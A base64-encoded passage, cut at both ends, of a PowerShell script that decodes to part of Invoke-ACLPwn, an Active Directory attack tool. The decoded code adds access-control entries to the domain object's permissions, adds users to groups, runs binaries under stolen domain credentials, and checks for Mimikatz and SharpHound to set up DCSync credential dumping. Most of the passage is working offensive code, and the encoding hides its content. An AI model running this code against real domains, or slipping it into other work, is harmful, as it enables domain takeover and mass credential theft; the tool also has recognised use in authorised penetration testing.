AwMDAwLCAkbnVsbCwgJEdldEN1cnJlbnRQYXRoLAogICAgICAgICAgICBbcmVmXSRTdGFydHVwSW5mbywgW3JlZl0kUHJvY2Vzc0luZm8pCiAgICAgICAgCiAgICAgICAgaWYgKCEkQ2FsbFJlc3VsdCkgewogICAgICAgICAgICBXcml0ZS1FcnJvciAiYG5NbW0sIHNvbWV0aGluZyB3ZW50IHdyb25nISBHZXRMYXN0RXJyb3IgcmV0dXJuZWQ6IgogICAgICAgICAgICBXcml0ZS1FcnJvciAgIj09PiAkKChOZXctT2JqZWN0IFN5c3RlbS5Db21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbihbaW50XVtLZXJuZWwzMl06OkdldExhc3RFcnJvcigpKSkuTWVzc2FnZSlgbiIKICAgICAgICB9IAp9CiAgICAKCmZ1bmN0aW9uIFdyaXRlLUdvb2QgKCRzdHIpIHsgICAgCiAgICAkbXNnID0gIlsrXWB0JHN0ciIKICAgIFdyaXRlLUhvc3QgJG1zZyAtRm9yZWdyb3VuZENvbG9yIEdyZWVuICAgIAoKICAgIGlmICgkbG9nVG9GaWxlKXsKICAgICAgICAkbXNnIHwgT3V0LUZpbGUgLUFwcGVuZCAtRmlsZVBhdGggJ0ludm9rZS1BQ0xQd24ubG9nJwogICAgfQp9CgpmdW5jdGlvbiBXcml0ZS1TdGF0dXMgKCRzdHIpIHsKICAgICRtc2cgPSAiWypdYHQkc3RyIgogICAgV3JpdGUtSG9zdCAkbXNnIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93ICAgIAoKICAgIGlmICgkbG9nVG9GaWxlKXsKICAgICAgICAkbXNnIHwgT3V0LUZpbGUgLUFwcGVuZCAtRmlsZVBhdGggJ0ludm9rZS1BQ0xQd24ubG9nJwogICAgfQp9CgpmdW5jdGlvbiBXcml0ZS1CYWQgKCRzdHIpIHsKICAgICRtc2cgPSAiWy1dYHQkc3RyIgogICAgV3JpdGUtSG9zdCAkbXNnIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICAgIAoKICAgIGlmICgkbG9nVG9GaWxlKXsKICAgICAgICAkbXNnIHwgT3V0LUZpbGUgLUFwcGVuZCAtRmlsZVBhdGggJ0ludm9rZS1BQ0xQd24ubG9nJwogICAgfQp9CgpmdW5jdGlvbiBHZXQtRXh0ZW5kZWRSaWdodEJ5TmFtZShbc3RyaW5nXSRkaXNwbGF5bmFtZSkgewogICAgcmV0dXJuICgkZ2xvYmFsOkFESW5mby5leHRlbmRlZFJpZ2h0cyB8IFdoZXJlLU9iamVjdCB7JF8ubGRhcERpc3BsYXlOYW1lIC1lcSAkZGlzcGxheW5hbWV9KS5zY2hlbWFJZEd1aWQuR3VpZAp9CgpmdW5jdGlvbiBJbnZva2UtQ21kKFtzdHJpbmddJGNtZCwgW3N0cmluZ10kYXJnVikgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJGNtZCkpewogICAgICAgIFdyaXRlLUVycm9yICJQYXRoICckY21kJyBkb2VzIG5vdCBleGlzdCEiCiAgICAgICAgcmV0dXJuCiAgICB9CgogICAgaWYgKCRnbG9iYWw6bGRhcENvbm5JbmZvLkludGVncmF0ZWRfTG9naW4pIHsKICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAiJCgkY21kKSAkYXJnViIgfCBvdXQtbnVsbAogICAgfSBlbHNlIHsKICAgICAgICBJbnZva2UtUnVuYXMgLVVzZXIgJGdsb2JhbDpsZGFwQ29ubkluZm8uc0FNQWNjb3VudE5hbWUgLVBhc3N3b3JkICRnbG9iYWw6bGRhcENvbm5JbmZvLnBhc3N3b3JkIC1Eb21haW4gJGdsb2JhbDpsZGFwQ29ubkluZm8uZG9tYWluIC1CaW5hcnkgJGNtZCAtTG9nb25UeXBlIDB4MiAtQXJncyAkYXJnVgogICAgfQp9CgojIFdyaXRlcyBBZGQtQUNFIGZ1bmN0aW9uIHRvIGZpbGUKZnVuY3Rpb24gV3JpdGUtQWRkQUNFVG9GaWxlIHsKCiAgICAkc2NyaXB0ID0gQCcKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBbQWxpYXMoKV0KICAgIFtPdXRwdXRUeXBlKFtpbnRdKV0KICAgIFBhcmFtCiAgICAoCiAgICAgICAgIyBQYXJhbTEgaGVscCBkZXNjcmlwdGlvbgogICAgICAgIFtzdHJpbmddJGRvbWFpbiwKICAgICAgICBbc3RyaW5nXSR1c2VybmFtZSwKICAgICAgICBbc3RyaW5nXSRwYXNzd29yZCwKICAgICAgICBbc3RyaW5nXSRwcm90b2NvbCA9ICdMREFQJywKICAgICAgICBbaW50XSRwb3J0ID0gMzg5LAogICAgICAgIAogICAgICAgICNBQ0UgcGFyYW1zCiAgICAgICAgW3N3aXRjaF0kaW50ZWdyYXRlZExvZ2luLAogICAgICAgIFtzdHJpbmddJHVzZXJTSURTdHJpbmcsICAgIAogICAgICAgIFtzdHJpbmddJHJpZ2h0VHlwZSwKICAgICAgICBbc3RyaW5nXSRhY3Rpb24sCiAgICAgICAgW3N0cmluZ10kcHJvcGVydHlHVUlECiAgICAKICAgICkKICAgIAogICAgI0dldCBkaXJlY3RvcnlFbnRyeQogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMgICAgCiAgICAKICAgICRsZGFwQ29ublN0cmluZyA9ICIkKCRwcm90b2NvbCk6Ly8kKCRkb21haW4pIiAgCiAgICAKICAgIHRyeSB7CiAgICAKICAgICAgICAjIHRyYW5zbGF0ZSBHVUlEcyBhbmQgU0lEcyBmcm9tIHN0cmluZyB0byBlaXRoZXIgR1VJRCBvYmplY3QgYW5kIGEgU0lEIG9iamVjdAogICAgICAgICRudWxsR1VJRCA9IFtndWlkXScwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAnCiAgICAgICAgJHByb3BHVUlEID0gW2d1aWRdJHByb3BlcnR5R1VJRAogICAgICAgICR1c2VyU0lEICA9ICBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyICR1c2VyU0lEU3RyaW5nCiAgICAKICAgICAgICAjIFdlIGRvbid0IG5lZWQgaW5oZXJpdGFuY2UKICAgICAgICAkaW5oZXJpdGFuY2VUeXBlID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlTZWN1cml0eUluaGVyaXRhbmNlXTo6Tm9uZQogICAgCiAgICAgICAgIyBCdWlsZCBBQ0UKICAgICAgICAkQUNFID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSAkdXNlclNJRCAsICRyaWdodFR5cGUsICRhY3Rpb24sICRwcm9wR1VJRCwgJGluaGVyaXRhbmNlVHlwZSwgJG51bGxHVUlECiAgICAKICAgICAgICAjIEFwcGx5IEFDRS4gU2V0IHNlY3VyaXR5IG1hc2tzIHRvIERBQ0wKICAgICAgICBpZiAoJGludGVncmF0ZWRMb2dpbikgeyAgICAgICAKICAgICAgICAgICAgJGRvbWFpbkRpckVudHJ5ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgJGxkYXBDb25uU3RyaW5nICAgICAgICAKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkZG9tYWluRGlyRW50cnkgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSAkbGRhcENvbm5TdHJpbmcsICR1c2VybmFtZSwgJHBhc3N3b3JkICAgCiAgICAgICAgfQogICAgCiAgICAgICAgJHNlY09wdGlvbnMgPSAkZG9tYWluRGlyRW50cnkuZ2V0X09wdGlvbnMoKQogICAgICAgICRzZWNPcHRpb25zLlNlY3VyaXR5TWFza3MgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlNlY3VyaXR5TWFza3NdOjpEYWNsCiAgICAgICAgJGRvbWFpbkRpckVudHJ5LlJlZnJlc2hDYWNoZSgpICAKICAgICAgICAkZG9tYWluRGlyRW50cnkuZ2V0X09iamVjdFNlY3VyaXR5KCkuQWRkQWNjZXNzUnVsZSgkQUNFKQogICAgCiAgICAgICAgIyBTYXZlIGFuZCBjbGVhbnVwCiAgICAgICAgJGRvbWFpbkRpckVudHJ5LkNvbW1pdENoYW5nZXMoKQogICAgICAgICRkb21haW5EaXJFbnRyeS5kaXNwb3NlKCkKICAgIAogICAgICAgIFdyaXRlLUhvc3QgJ0RvbmUnIC1Ob05ld2xpbmUKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICBXcml0ZS1Ib3N0ICRfLkV4Y2VwdGlvbgogICAgfSAgCidACgogICAgJHNjcmlwdCB8IE91dC1GaWxlICdBZGQtQUNFLnBzMScKCiAgICAkZ2xvYmFsOmZpbGVzQ3JlYXRlZCArPSAnQWRkLUFDRS5wczEnICAgIAogICAgJGdsb2JhbDpBQ0VTY3JpcHQgPSAoR2V0LUNoaWxkSXRlbSAtRmlsdGVyICdBZGQtQUNFLnBzMScpLkZ1bGxOYW1lCn0KCiMgV3JpdGVzIEFkZFRvR3JvdXAgZnVuY3Rpb24gdG8gZmlsZQpmdW5jdGlvbiBXcml0ZS1BZGRUb0dyb3VwVG9GaWxlIHsKCiAgICAkc2NyaXB0ID0gQCcKICAgICAgICBbQ21kbGV0QmluZGluZygpXQogICAgW0FsaWFzKCldCiAgICBbT3V0cHV0VHlwZShbaW50XSldCiAgICBQYXJhbQogICAgKAogICAgICAgICMgUGFyYW0xIGhlbHAgZGVzY3JpcHRpb24KICAgICAgICBbc3RyaW5nXSRkb21haW4sICAgIAogICAgICAgIFtzdHJpbmddJHVzZXJuYW1lLAogICAgICAgIFtzdHJpbmddJHBhc3N3b3JkLAogICAgICAgIFtzdHJpbmddJHByb3RvY29sID0gJ0xEQVAnLAogICAgICAgIFtzdHJpbmddJHBvcnQgPSAzODksCgogICAgICAgIFtzdHJpbmddJGdyb3VwRE4sCiAgICAgICAgW3N0cmluZ10kdXNlckROCiAgICApCgogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMgICAgCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudCAKCgogICAgJHByaW5jaXBhbENvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5QcmluY2lwYWxDb250ZXh0ICdEb21haW4nLCAkZG9tYWluLCAkdXNlcm5hbWUsICRwYXNzd29yZAogICAgJGlkVHlwZSA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuSWRlbnRpdHlUeXBlXTo6RGlzdGluZ3Vpc2hlZE5hbWUKICAgICRncnBQcmluY2lwYWwgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50Lkdyb3VwUHJpbmNpcGFsXTo6RmluZEJ5SWRlbnRpdHkoJHByaW5jaXBhbENvbnRleHQsICRpZFR5cGUsICRncm91cEROKQoKICAgIHRyeSB7CiAgICAgICAgaWYgKCRncnBQcmluY2lwYWwgLWVxICRudWxsKSB7ICAgICAgICAKICAgICAgICAgICAgV3JpdGUtSG9zdCAnRXJyb3InIC1Ob05ld2xpbmUgICAgICAgIAogICAgICAgIH0gCiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRncnBQcmluY2lwYWwuTWVtYmVycy5BZGQoJHByaW5jaXBhbENvbnRleHQsICRpZFR5cGUsICR1c2VyRE4pCiAgICAgICAgICAgICRncnBQcmluY2lwYWwuU2F2ZSgpICAgICAgICAKCiAgICAgICAgICAgIFdyaXRlLUhvc3QgJ0RvbmUnIC1Ob05ld2xpbmUKICAgICAgICB9CiAgICB9IGNhdGNoIHsKICAgICAgICBXcml0ZS1Ib3N0ICdFcnJvcicgLU5vTmV3bGluZQogICAgfQoKICAgICMgY2xlYW51cAogICAgJHByaW5jaXBhbENvbnRleHQuRGlzcG9zZSgpCgogICAgaWYgKCRncnBQcmluY2lwYWwgLW5lICRudWxsKSB7CiAgICAgICAgJGdycFByaW5jaXBhbC5EaXNwb3NlKCkKICAgIH0KJ0AKICAgICRzY3JpcHQgfCBPdXQtRmlsZSAnQWRkLVRvR3JvdXAucHMxJwoKICAgICRnbG9iYWw6ZmlsZXNDcmVhdGVkICs9ICdBZGQtVG9Hcm91cC5wczEnICAgIAogICAgJGdsb2JhbDpBZGRUb0dyb3VwU2NyaXB0RmlsZSA9IChHZXQtQ2hpbGRJdGVtIC1GaWx0ZXIgJ0FkZC1Ub0dyb3VwLnBzMScpLkZ1bGxOYW1lCn0KCgpmdW5jdGlvbiBDaGVjay1FbnYgewogICAgCiAgICBpZiAoW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJG1pbWlLYXR6TG9jYXRpb24pKXsKCiAgICAgICAgaWYgKC1ub3QgJE5vRENTeW5jKXsKICAgICAgICAgICAgV3JpdGUtQmFkICJQbGVhc2Ugc3BlY2lmeSBtaW1pa2F0eiBsb2NhdGlvbiEiCiAgICAgICAgICAgIHJldHVybiAkZmFsc2UKICAgICAgICB9ICAgICAgICAKICAgIH0KCiAgICBpZiAoW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJFNoYXJwSG91bmRMb2NhdGlvbikpewogICAgICAgIFdyaXRlLUJhZCAiUGxlYXNlIHNwZWNpZnkgc2hhcnBob3VuZCBsb2NhdGlvbiEiCiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQoKICAgICMgRG9uJ3QgY2xlYW4gdXAgaWYgTk9EQ1NZTkMgaXMgc2V0CiAgICBpZiAoJE5vRENTeW5jIC1vciAkTm9TZWNDbGVhbnVwKSB7CiAgICAgICAgJGdsb2JhbDpOb1NlY0NsZWFudXAgPSAkdHJ1ZQogICAgfQoKICAgICMgU3RydWN0dXJlIHdpdGggTERBUCBjb25uZWN0aW9uIGluZm8KICAgICRnbG9iYWw6bGRhcENvbm5JbmZvID0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAnZG9tYWluJyAgICAgICAgICAgID0gJGRvbWFpbgogICAgICAgICd1c2VybmFtZScgICAgICAgICAgPSAkdXNlcm5hbWUKICAgICAgICAncGFzc3dvcmQnICAgICAgICAgID0gJHBhc3N3b3JkCiAgICAgICAgJ3Byb3RvY29sJyAgICAgICAgICA9ICRwcm90b2NvbAogICAgICAgICdwb3J0JyAgICAgICAgICAgICAgPSAkcG9ydAogICAgICAgICdJbnRlZ3JhdGVkX0xvZ2luJyAgPSAkZmFsc2UKICAgICAgICAnTERBUENvbm5TdHJpbmcnICAgID0gIiRwcm90b2NvbGA6Ly8kZG9tYWluYDokcG9ydCIgICAgCiAgICAgICAgJ3VzZXJQcmluY2lwYWxOYW1lJyA9ICcnCiAgICAgICAgJ3NBTUFjY291bnROYW1lJyAgICA9ICcnCiAgICAgICAgJ2Rpc3Rpbmd1aXNoZWROYW1lJyA9ICcnCiAgICB9CiAgICAKICAgICMgU3RydWN0dXJlIHdpdGggQUQgaW5mbwogICAgJGdsb2JhbDpBREluZm8gPSBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSBAewogICAgICAgICdwcmltYXJ5REMnICAgICAgICAgICAgICAgICAgPSAnJwogICAgICAgICdzY2hlbWFOYW1pbmdDb250ZXh0JyAgICAgICAgPSAnJwogICAgICAgICdDb25maWd1cmF0aW9uTmFtaW5nQ29udGV4dCcgPSAnJwogICAgICAgICdkb21haW5ETicgICAgICAgICAgICAgICAgICAgPSAnJwogICAgICAgICdzY2hlbWFDbGFzc2VzJyAgICAgICAgICAgICAgPSAkbnVsbAogICAgICAgICdleHRlbmRlZFJpZ2h0cycgICAgICAgICAgICAgPSAkbnVsbAogICAgfQogICAgCiAgICAjIEFycmF5IHdoZXJlIHdlIHN0b3JlIG91ciBBQ0VzIGluCiAgICAkZ2xvYmFsOkFDRXMgPSBAKCkKICAgIAogICAgIyBIYXNodGFibGUgY29udGFpbmluZyBTSURzIGFuZCBpZGVudGl0eVJlZmVyZW5jZSB0aGF0IHdhcyBxdWVyaWVkIGZyb20gdGhlIGRvbWFpbi4KICAgICMgV2Ugc3RvcmUgaXQgaW4gYSBoYXNodGFibGUgdG8ga2VlcCB0aGUgbGRhcCBxdWVyaWVzIHRvIGEgbWluaW11bQogICAgJGdsb2JhbDpkaWNLbm93blNpZHMgPSBAewogICAgICAgICJTLTEtMCIgICAgICAgICAgICAgICAgICA9ICJOdWxsIEF1dGhvcml0eSI7IGAKICAgICAgICAgICAgIlMtMS0wLTAiICAgICAgICAgICAgPSAiTm9ib2R5IjsgYAogICAgICAgICAgICAiUy0xLTEiICAgICAgICAgICAgICA9ICJXb3JsZCBBdXRob3JpdHkiOyBgCiAgICAgICAgICAgICJTLTEtMS0wIiAgICAgICAgICAgID0gIkV2ZXJ5b25lIjsgYAogICAgICAgICAgICAiUy0xLTIiICAgICAgICAgICAgICA9ICJMb2NhbCBBdXRob3JpdHkiOyBgCiAgICAgICAgICAgICJTLTEtMi0wIiAgICAgICAgICAgID0gIkxvY2FsICI7IGAKICAgICAgICAgICAgIlMtMS0yLTEiICAgICAgICAgICAgPSAiQ29uc29sZSBMb2dvbiAiOyBgCiAgICAgICAgICAgICJTLTEtMyIgICAgICAgICAgICAgID0gIkNyZWF0b3IgQXV0aG9yaXR5IjsgYAogICAgICAgICAgICAiUy0xLTMtMCIgICAgICAgICAgICA9ICJDcmVhdG9yIE93bmVyIjsgYAogICAgICAgICAgICAiUy0xLTMtMSIgICAgICAgICAgICA9ICJDcmVhdG9yIEdyb3VwIjsgYAogICAgICAgICAgICAiUy0xLTMtMiIgICAgICAgICAgICA9ICJDcmVhdG9yIE93bmVyIFNlcnZlciI7IGAKICAgICAgICAgICAgIlMtMS0zLTMiICAgICAgICAgICAgPSAiQ3JlYXRvciBHcm91cCBTZXJ2ZXIiOyBgCiAgICAgICAgICAgICJTLTEtMy00IiAgICAgICAgICAgID0gIk93bmVyIFJpZ2h0cyI7IGAKICAgICAgICAgICAgIlMtMS00IiAgICAgICAgICAgICAgPSAiTm9uLXVuaXF1ZSBBdXRob3JpdHkiOyBgCiAgICAgICAgICAgICJTLTEtNSIgICAgICAgICAgICAgID0gIk5UIEF1dGhvcml0eSI7IGAKICAgICAgICAgICAgIlMtMS01LTEiICAgICAgICAgICAgPSAiRGlhbHVwIjsgYAogICAgICAgICAgICAiUy0xLTUtMiIgICAgICAgICAgICA9ICJOZXR3b3JrIjsgYAogICAgICAgICAgICAiUy0xLTUtMyIgICAgICAgICAgICA9ICJCYXRjaCI7IGAKICAgICAgICAgICAgIlMtMS01LTQiICAgICAgICAgICAgPSAiSW50ZXJhY3RpdmUiOyBgCiAgICAgICAgICAgICJTLTEtNS02IiAgICAgICAgICAgID0gIlNlcnZpY2UiOyBgCiAgICAgICAgICAgICJTLTEtNS03IiAgICAgICAgICAgID0gIkFub255bW91cyI7IGAKICAgICAgICAgICAgIlMtMS01LTgiICAgICAgICAgICAgPSAiUHJveHkiOyBgCiAgICAgICAgICAgICJTLTEtNS05IiAgICAgICAgICAgID0gIkVudGVycHJpc2UgRG9tYWluIENvbnRyb2xsZXJzIjsgYAogICAgICAgICAgICAiUy0xLTUtMTAiICAgICAgICAgICA9ICJQcmluY2lwYWwgU2VsZiI7IGAKICAgICAgICAgICAgIlMtMS01LTExIiAgICAgICAgICAgPSAiQXV0aGVudGljYXRlZCBVc2VycyI7IGAKICAgICAgICAgICAgIlMtMS01LTEyIiAgICAgICAgICAgPSAiUmVzdHJpY3RlZCBDb2RlIjsgYAogICAgICAgICAgICAiUy0xLTUtMTMiICAgICAgICAgICA9ICJUZXJtaW5hbCBTZXJ2ZXIgVXNlcnMiOyBgCiAgICAgICAgICAgICJTLTEtNS0xNCIgICAgICAgICAgID0gIlJlbW90ZSBJbnRlcmFjdGl2ZSBMb2dvbiI7IGAKICAgICAgICAgICAgIlMtMS01LTE1IiAgICAgICAgICAgPSAiVGhpcyBPcmdhbml6YXRpb24iOyBgCiAgICAgICAgICAgICJTLTEtNS0xNyIgICAgICAgICAgID0gIklVU1IiOyBgCiAgICAgICAgICAgICJTLTEtNS0xOCIgICAgICAgICAgID0gIkxvY2FsIFN5c3RlbSI7IGAKICAgICAgICAgICAgIlMtMS01LTE5IiAgICAgICAgICAgPSAiTlQgQXV0aG9yaXR5IjsgYAogICAgICAgICAgICAiUy0xLTUtMjAiICAgICAgICAgICA9ICJOVCBBdXRob3JpdHkiOyBgCiAgICAgICAgICAgICJTLTEtNS0yMiIgICAgICAgICAgID0gIkVOVEVSUFJJU0UgUkVBRC1PTkxZIERPTUFJTiBDT05UUk9MTEVSUyBCRVRBIjsgYAogICAgICAgICAgICAiUy0xLTUtMzItNTQ0IiAgICAgICA9ICJBZG1pbmlzdHJhdG9ycyI7IGAKICAgICAgICAgICAgIlMtMS01LTMyLTU0NSIgICAgICAgPSAiVXNlcnMiOyBgCiAgICAgICAgICAgICJTLTEtNS0zMi01NDYiICAgICAgID0gIkd1ZXN0cyI7IGAKICAgICAgICAgICAgIlMtMS01LTMyLTU0NyIgICAgICAgPSAiUG93ZXIgVXNlcnMiOyBgCiAgICAgICAgICAgICJTLTEtNS0zMi01NDgiICAgICAgID0gIkJVSUxUSU5cQWNjb3VudCBPcGVyYXRvcnMiOyBgCiAgICAgICAgICAgICJTLTEtNS0zMi01NDkiICAgICAgID0gIlNlcnZlciBPcGVyYXRvcnMiOyBgCiAgICAgICAgICAgICJTLTEtNS0zMi01NTAiICAgICAgID0gIlByaW50IE9wZXJhdG9ycyI7IGAKICAgICAgICAgICAgIlMtMS01LTMyLTU1MSIgICAgICAgPSAiQmFja3VwIE9wZXJhdG9ycyI7IGAKICAgICAgICAgICAgIlMtMS01LTMyLTU1MiIgICAgICAgPSAiUmVwbGljYXRvciI7IGAKICAgICAgICAgICAgIlMtMS01LTMyLTU1NCIgICAgICAgPSAiQlVJTFRJTlxQcmUtV2luZG93cyAyMDAwIENvbXBhdGlibGUgQWNjZXNzIjsgYAogICAgICAgICAgICAiUy0xLTUtMzItNTU1IiAgICAgICA9ICJCVUlMVElOXFJlbW90ZSBEZXNrdG9wIFVzZXJzIjsgYAogICAgICAgICAgICAiUy0xLTUtMzItNTU2IiAgICAgICA9ICJCVUlMVElOXE5ldHdvcmsgQ29uZmlndXJhdGlvbiBPcGVyYXRvcnMiOyBgCiAgICAgICAgICAgICJTLTEtNS0zMi01NTciICAgICAgID0gIkJVSUxUSU5cSW5jb21pbmcgRm9yZXN0IFRydXN0IEJ1aWxkZXJzIjsgYAogICAgICAgICAgICAiUy0xLTUtMzItNTU4IiAgICAgICA9ICJCVUlMVElOXFBlcmZvcm1hbmNlIE1vbml0b3IgVXNlcnMiOyBgCiAgICAgICAgICAgICJTLTEtNS0zMi01NTkiICAgICAgID0gIkJVSUxUSU5cUGVyZm9ybWFuY2UgTG9nIFVzZXJzIjsgYAogICAgICAgICAgICAiUy0xLTUtMzItNTYwIiAgICAgICA9ICJCVUlMVElOXFdpbmRvd3MgQXV0aG9yaXphdGlvbiBBY2Nlc3MgR3JvdXAiOyBgCiAgICAgICAgICAgICJTLTEtNS0zMi01NjEiICAgICAgID0gIkJVSUxUSU5cVGVybWluYWwgU2VydmVyIExpY2Vuc2UgU2VydmVycyI7IGAKICAgICAgICAgICAgIlMtMS01LTMyLTU2MiIgICAgICAgPSAiQlVJTFRJTlxEaXN0cmlidXRlZCBDT00gVXNlcnMiOyBgCiAgICAgICAgICAgICJTLTEtNS0zMi01NjgiICAgICAgID0gIkJVSUxUSU5cSUlTX0lVU1JTIjsgYAogICAgICAgICAgICAiUy0xLTUtMzItNTY5IiAgICAgICA9ICJCVUlMVElOXENyeXB0b2dyYXBoaWMgT3BlcmF0b3JzIjsgYAogICAgICAgICAgICAiUy0xLTUtMzItNTczIiAgICAgICA9ICJCVUlMVElOXEV2ZW50IExvZyBSZWFkZXJzICI7IGAKICAgICAgICAgICAgIlMtMS01LTMyLTU3NCIgICAgICAgPSAiQlVJTFRJTlxDZXJ0aWZpY2F0ZSBTZXJ2aWNlIERDT00gQWNjZXNzIjsgYAogICAgICAgICAgICAiUy0xLTUtMzItNTc1IiAgICAgICA9ICJCVUlMVElOXFJEUyBSZW1vdGUgQWNjZXNzIFNlcnZlcnMiOyBgCiAgICAgICAgICAgICJTLTEtNS0zMi01NzYiICAgICAgID0gIkJVSUxUSU5cUkRTIEVuZHBvaW50IFNlcnZlcnMiOyBgCiAgICAgICAgICAgICJTLTEtNS0zMi01NzciICAgICAgID0gIkJVSUxUSU5cUkRTIE1hbmFnZW1lbnQgU2VydmVycyI7IGAKICAgICAgICAgICAgIlMtMS01LTMyLTU3OCIgICAgICAgPSAiQlVJTFRJTlxIeXBlci1WIEFkbWluaXN0cmF0b3JzIjsgYAogICAgICAgICAgICAiUy0xLTUtMzItNTc5IiAgICAgICA9ICJCVUlMVElOXEFjY2VzcyBDb250cm9sIEFzc2lzdGFuY2UgT3BlcmF0b3JzIjsgYAogICAgICAgICAgICAiUy0xLTUtMzItNTgwIiAgICAgICA9ICJCVUlMVElOXFJlbW90ZSBNYW5hZ2VtZW50IFVzZXJzIjsgYAogICAgICAgICAgICAiUy0xLTUtMzMiICAgICAgICAgICA9ICJXcml0ZSBSZXN0cmljdGVkIENvZGUiOyBgCiAgICAgICAgICAgICJTLTEtNS02NC0xMCIgICAgICAgID0gIk5UTE0gQXV0aGVudGljYXRpb24iOyBgCiAgICAgICAgICAgICJTLTEtNS02NC0xNCIgICAgICAgID0gIlNDaGFubmVsIEF1dGhlbnRpY2F0aW9uIjsgYAogICAgICAgICAgICAiUy0xLTUtNjQtMjEiICAgICAgICA9ICJEaWdlc3QgQXV0aGVudGljYXRpb24iOyBgCiAgICAgICAgICAgICJTLTEtNS02NS0xIiAgICAgICAgID0gIlRoaXMgT3JnYW5pemF0aW9uIENlcnRpZmljYXRlIjsgYAogICAgICAgICAgICAiUy0xLTUtODAiICAgICAgICAgICA9ICJOVCBTZXJ2aWNlIjsgYAogICAgICAgICAgICAiUy0xLTUtODQtMC0wLTAtMC0wIiA9ICJVc2VyIE1vZGUgRHJpdmVycyI7IGAKICAgICAgICAgICAgIlMtMS01LTExMyIgICAgICAgICAgPSAiTG9jYWwgQWNjb3VudCI7IGAKICAgICAgICAgICAgIlMtMS01LTExNCIgICAgICAgICAgPSAiTG9jYWwgQWNjb3VudCBBbmQgTWVtYmVyIE9mIEFkbWluaXN0cmF0b3JzIEdyb3VwIjsgYAogICAgICAgICAgICAiUy0xLTUtMTAwMCIgICAgICAgICA9ICJPdGhlciBPcmdhbml6YXRpb24iOyBgCiAgICAgICAgICAgICJTLTEtMTUtMi0xIiAgICAgICAgID0gIkFsbCBBcHAgUGFja2FnZXMiOyBgCiAgICAgICAgICAgICJTLTEtMTYtMCIgICAgICAgICAgID0gIlVudHJ1c3RlZCBNYW5kYXRvcnkgTGV2ZWwiOyBgCiAgICAgICAgICAgICJTLTEtMTYtNDA5NiIgICAgICAgID0gIkxvdyBNYW5kYXRvcnkgTGV2ZWwiOyBgCiAgICAgICAgICAgICJTLTEtMTYtODE5MiIgICAgICAgID0gIk1lZGl1bSBNYW5kYXRvcnkgTGV2ZWwiOyBgCiAgICAgICAgICAgICJTLTEtMTYtODQ0OCIgICAgICAgID0gIk1lZGl1bSBQbHVzIE1hbmRhdG9yeSBMZXZlbCI7IGAKICAgICAgICAgICAgIlMtMS0xNi0xMjI4OCIgICAgICAgPSAiSGlnaCBNYW5kYXRvcnkgTGV2ZWwiOyBgCiAgICAgICAgICAgICJTLTEtMTYtMTYzODQiICAgICAgID0gIlN5c3RlbSBNYW5kYXRvcnkgTGV2ZWwiOyBgCiAgICAgICAgICAgICJTLTEtMTYtMjA0ODAiICAgICAgID0gIlByb3RlY3RlZCBQcm9jZXNzIE1hbmRhdG9yeSBMZXZlbCI7IGAKICAgICAgICAgICAgIlMtMS0xNi0yODY3MiIgICAgICAgPSAiU2VjdXJlIFByb2Nlc3MgTWFuZGF0b3J5IExldmVsIjsgYAogICAgICAgICAgICAiUy0xLTE4LTEiICAgICAgICAgICA9ICJBdXRoZW50aWNhdGlvbiBBdXRob3JpdHkgQXNzZXJ0ZWQgSWRlbnRpdHlsIjsgYAogICAgICAgICAgICAiUy0xLTE4LTIiICAgICAgICAgICA9ICJTZXJ2aWNlIEFzc2VydGVkIElkZW50aXR5IgogICAgfQoKICAgICRyZXN1bHQgPSAkdHJ1ZQogICAgCiAgICAjIEltcG9ydCBhc3NlbWJsaWVzCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcyAgICAKICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50IAogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uSU8uQ29tcHJlc3Npb24uRmlsZVN5c3RlbQoKICAgIGlmICgkbG9nVG9GaWxlKXsKICAgICAgICAiJCgiYHJgbiIpJCgnPScqIDEyMCkiIHwgT3V0LUZpbGUgJ0ludm9r